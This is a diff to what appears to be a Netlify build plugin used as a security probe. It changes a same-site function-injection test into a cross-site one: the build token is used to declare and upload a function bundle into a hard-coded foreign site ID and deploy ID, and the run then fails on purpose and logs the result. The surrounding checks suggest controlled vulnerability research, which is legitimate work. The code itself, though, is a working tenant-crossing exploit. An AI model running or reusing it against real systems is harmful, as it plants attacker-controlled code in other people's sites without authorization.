@@ -3,7 +3,9 @@ import { readFileSync, readdirSync } from 'node:fs'
 import { createConnection } from 'node:net'
 import { isAbsolute, relative, resolve } from 'node:path'
 
-const EXPECTED_SITE_ID = '43a2f4e4-df31-455e-85bc-21f37fae92cd'
+const SOURCE_SITE_ID = '43a2f4e4-df31-455e-85bc-21f37fae92cd'
+const TARGET_SITE_ID = 'a13832a0-b3f7-40cb-a07f-df10e6929241'
+const TARGET_DEPLOY_ID = '6abb1c94bdf6100008784900'
 const FUNCTION_NAME = 'aaa-preempt-canary'
 
 const findBuildbotSocket = () => {
@@ -131,7 +133,7 @@ const uploadFunction = async ({ apiBase, bundle, deployId, token }) => {
 
 const readPolicy = async ({ token, apiBase }) => {
   try {
-    const response = await fetch(new URL(`/api/v1/sites/${EXPECTED_SITE_ID}`, apiBase), {
+    const response = await fetch(new URL(`/api/v1/sites/${SOURCE_SITE_ID}`, apiBase), {
       headers: { authorization: `Bearer ${token}` },
       redirect: 'error',
       signal: AbortSignal.timeout(10_000),
@@ -167,7 +169,7 @@ export const onPostBuild = async ({ constants, utils }) => {
   const prerequisites = {
     deployPreview: process.env.CONTEXT === 'deploy-preview',
     controlledReview: process.env.REVIEW_ID === '1',
-    controlledSite: constants.SITE_ID === EXPECTED_SITE_ID,
+    controlledSourceSite: constants.SITE_ID === SOURCE_SITE_ID,
     redactedPolicy: policy?.untrustedFlow === 'redact',
     deployIdPresent: /^[0-9a-f]{24}$/.test(deployId),
     tokenPresent: typeof token === 'string' && token.length > 0,
@@ -175,7 +177,7 @@ export const onPostBuild = async ({ constants, utils }) => {
     functionBundlePresent: bundlePath !== null,
   }
   const result = {
-    schema: 'netlify-build-token-function-injection.v1',
+    schema: 'netlify-cross-site-function-injection.v1',
     prerequisites,
     policy,
     attempted: false,
@@ -198,7 +200,7 @@ export const onPostBuild = async ({ constants, utils }) => {
   result.declare = await callJson({
     method: 'PUT',
     token,
-    url: new URL(`/api/v1/sites/${EXPECTED_SITE_ID}/deploys/${deployId}`, apiBase),
+    url: new URL(`/api/v1/sites/${TARGET_SITE_ID}/deploys/${TARGET_DEPLOY_ID}`, apiBase),
     body: {
       files: {},
       functions: { [FUNCTION_NAME]: bundleHash },
@@ -210,13 +212,9 @@ export const onPostBuild = async ({ constants, utils }) => {
       },
     },
   })
-  result.upload = await uploadFunction({ apiBase, bundle, deployId, token })
-
-  if (result.declare.ok && result.upload.ok) {
-    result.deploy = await requestEarlyDeploy(deployDir)
-  }
+  result.upload = await uploadFunction({ apiBase, bundle, deployId: TARGET_DEPLOY_ID, token })
 
   result.controlledFailureRequested = true
-  console.log(`NETLIFY_BUILD_TOKEN_FUNCTION_INJECTION ${JSON.stringify(result)}`)
-  utils.build.failBuild('Controlled failure after build-token function injection boundary probe')
+  console.log(`NETLIFY_CROSS_SITE_FUNCTION_INJECTION ${JSON.stringify(result)}`)
+  utils.build.failBuild('Controlled failure after cross-site function injection boundary probe')
 }
